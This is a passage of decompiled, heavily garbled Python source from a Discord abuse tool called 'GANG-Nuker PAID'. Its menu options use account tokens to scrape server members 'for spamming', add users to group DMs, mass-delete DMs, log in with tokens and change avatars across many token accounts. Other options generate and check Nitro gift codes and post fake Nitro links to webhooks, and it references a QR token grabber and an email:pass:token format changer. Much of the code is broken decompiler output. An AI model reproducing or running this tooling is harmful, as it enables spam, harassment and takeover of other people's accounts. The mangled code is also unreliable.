                    []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}'''](None, None, None)
                if not []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']['\n[']:
                    pass
                []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']
                []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   ']
                []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}''']
                []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members']
            finally:
                pass
            []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']['\n[']
            []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']
            (print(f'''[{Fore.LIGHTRED_EX}-{Fore.RESET}] RateLimited for {jsr['retry_after']} seconds'''), time.sleep(jsr['retry_after']))
            scrIds = random.choice(open('data/groups.txt').readlines())
            grID = scrIds.strip('\n')
            r2 = requests.put(f'''https://discord.com/api/v9/channels/{grID}/recipients/{UserID}''', {
                'Authorization': token }, **('headers',))
            if r2.status_code == 204:
                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group Members: {UserID}''')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '23':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Auto_Login.TokenLogin(token)
    if choice == '24':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Account Token: ')
        validateToken(token)
        processes = []
        channelIds = requests.get('https://discord.com/api/v9/users/@me/channels', getheaders(token), **('headers',)).json()
        if not channelIds:
            print('[\x1b[95m>\x1b[95m\x1b[37m] This Token Has 0 Dms to Delete!')
            sleep(2)
            spammer()
        for t in (lambda .0 = []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}''']: [ channelIds[i:i + 3] for i in .0 ])(range(0, len(channelIds), 3)):
            channel = None
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
    if choice == '25':
        Spinner()
        os.startfile(os.getcwd() + './GENERATOR.exe')
    if choice == '26':
        Spinner()
        webhooklink = str(input('\n[\x1b[95m>\x1b[95m\x1b[37m] Webhook URL: '))
        count = 0
        webhook = '~~WEBHOOK_URL~~'.replace('~~WEBHOOK_URL~~', webhooklink)
        
        try:
            code = ''.join((lambda .0: for _ in .0:
random.SystemRandom().choice(string.ascii_letters + string.digits))(range(24)))
            post = {
                'content': 'https://discord.com/billing/promotions/' + code }
            head = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'content-type': 'application/json' }
            count += 1
            print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Generated Nitro | [{count}]''')
            s = requests.post(webhook, post, head, **('json', 'headers'))
        finally:
            pass
        []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']
        []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n[']
        print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error...''')
        continue
        if choice == '27':
            WebHook = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Webhook URL: ')
            validateWebhook(WebHook)
            utilities.Plugins.QR_Grabber.QR_Grabber(WebHook)

    if choice == '28':
        Spinner()
        tukan = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Account Token: ')
        guildd = input('[\x1b[95m>\x1b[95m\x1b[37m] Server ID: ')
        chann = input('[\x1b[95m>\x1b[95m\x1b[37m] Channel ID: ')
        bot = discum.Client(tukan, **('token',))
        
        def closefetching(resp = []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}'''], guildid = []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n[']):
            if bot.gateway.finishedMemberFetching(guildid):
                lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                print(str(lenmembersfetched))
                bot.gateway.removeCommand({
                    'function': closefetching,
                    'params': {
                        'guildid': guildid } })
                bot.gateway.close()
                return None

        
        def getmembers(guildid = []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'], channelid = []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}''']):
            bot.gateway.fetchMembers(guildid, channelid, 'all', 1, **('keep', 'wait'))
            bot.gateway.command({
                'function': closefetching,
                'params': {
                    'guildid': guildid } })
            bot.gateway.run()
            bot.gateway.resetSession()
            return bot.gateway.session.guild(guildid).members

        members = getmembers(guildd, chann)
        memberids = []
        for memberId in members:
            memberids.append(memberId)
        cls()
        with open('data/members.txt', 'w') as ids:
            for element in memberids:
                ids.write(element + '\n')
            []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}'''](None, None, None)
        if not []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n[']:
            pass
        []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']
        []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######']
        []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']
        []['\n'][f'''{Fore.RESET}''']
        print(f'''\n[\x1b[95m>\x1b[95m\x1b[37m] Finished Scraping {len(memberids)} members!\n(The members have already been put into the correct files for spamming!)''')
        time.sleep(1)
        exit = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '29':
        Spinner()
        
        def change_pfp():
            tokens = open('tokens.txt', 'r').read().splitlines()
            token = random.choice(tokens)
            picture = (lambda .0: [ f for f in .0 if isfile(join('utilities/Avatars/', f)) ])(os.listdir('utilities/Avatars/'))
            random_picture = random.choice(picture)
            with open(f'''utilities/Avatars/{random_picture}''', 'rb') as image_file:
                encoded_string = base64.b64encode(image_file.read())
                None(None, None, None)
            if not None:
                pass
            headers = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE0MjAwMCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
            json = {
                'avatar': f'''data:image/png;base64,{encoded_string.decode('utf-8')}''' }
            r = requests.patch('https://discord.com/api/v9/users/@me', headers, json, **('headers', 'json'))
            if r.status_code == 200:
                print(f'''\n[{g}+{Fore.RESET}] Successfully Changed PFP | {token}''')
                return None
            'x-super-properties'(f'''[{r}!{Fore.RESET}] Error...''')

        threads = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Amount of PFP?: ')
        for i in range(int(threads)):
            threading.Thread(change_pfp, **('target',)).start()
    if choice == '30':
        Spinner()
        Write.Print('Hello, thanks for using GANG-Nuker PAID!\nif you run into any problems make sure to let me know asap!\nDiscord: ††#1792\nPAID VERSION! This has alot more features that work and that are overpowered! <3\n\n', Colors.purple_to_blue, 0.015, **('interval',))
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '31':
        Spinner()
        print(f'''\n[\x1b[95m#\x1b[95m\x1b[37m] Current: {Fore.RED}{threads}{Fore.RESET}''')
        
        try:
            amount = int(input('\n[\x1b[95m>\x1b[95m\x1b[37m] Thread Amount: '))
        finally:
            pass
        []['\n']
        []['\n']
        print(f'''{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] | Invalid Amount!''')
        sleep(1.5)
        spammer()
        if amount >= 40:
            print(f'''[{Fore.RED}ERROR{Fore.RESET}] | Having {Fore.RED}{amount}{Fore.RESET} Will Cause Ratelimited! Try Something Lower...''')
            sleep(4)
            spammer()
        elif amount >= 15:
            print(f'''[\x1b[95m>\x1b[95m\x1b[37m] Having More Than 15 Threads Can Cause Lag and Ratelimit... [{Fore.RED}{amount}{Fore.RESET}]\n[\x1b[95m>\x1b[95m\x1b[37m] Continue With High Thread?''')
            yesno = input('\n[\x1b[95m>\x1b[95m\x1b[37m] y/n?: ')
            if yesno.lower() != 'y':
                sleep(0.5)
                spammer()

        threads = amount
        SlowPrint(f'''[\x1b[95m>\x1b[95m\x1b[37m] Thread Changed to: {amount}''')
        sleep(1)
        spammer()
    if choice == '32':
        exit = input(f'''\n[{Fore.RED}>{Fore.RESET}] Are You Sure You Want To Exit GANG-Nuker PAID? [Y/N]]: ''')
        if exit.lower() == 'y' or exit.lower() == 'yes':
            sys.exit(0)
        if exit.lower() == 'n' or exit.lower() == 'no':
            spammer()
    if choice == '>':
        cls()
        gangnukerlogo()
        []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['39'][f'''{Fore.RESET}'''][f'''{m}'''][']']([]['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['39'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}''']([]['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['39'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Credits\n        ']))
        choice = input(f'''{m}[{w}>{m}]{w} Choice?: ''')
        if choice == '33':
            Spinner()
            num = int(input('\n[\x1b[95m>\x1b[95m\x1b[37m] How Many Nitros Would You Like To Generate?: '))
            with open('data/nitro.txt', 'w', 'utf-8', **('encoding',)) as file:
                start = time.time()
                for i in range(num):
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, 16, **('k',)))
                    file.write(f'''https://discord.gift/{code}\n''')
                print(f'''[{g}+{w}] {num} Codes Where Generated, Checking All Nitro Codes!\n''')
                []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['39'][f'''{Fore.RESET}'''][f'''{m}'''](None, None, None)
            if not []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['39'][f'''{Fore.RESET}''']:
                pass
            []['\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['33'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Nitro Generator / Checker     '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['40'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Format Changer [Email:Pass:Token]                         '][f'''{m}''']['['][f'''{w}''']['<'][f'''{m}'''][']'][f'''{w}'''][' Previous Page\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['34'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Emoji Spammer   \n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['35'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Advanced Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['36'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Multi Channel Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['37'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Message Reply Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['38'][f'''{Fore.RESET}'''][f'''{m}'''][']'][f'''{Fore.RESET}'''][' Channel Thread Spammer\n'][f'''{m}''']['['][f'''{Fore.WHITE}''']['39']
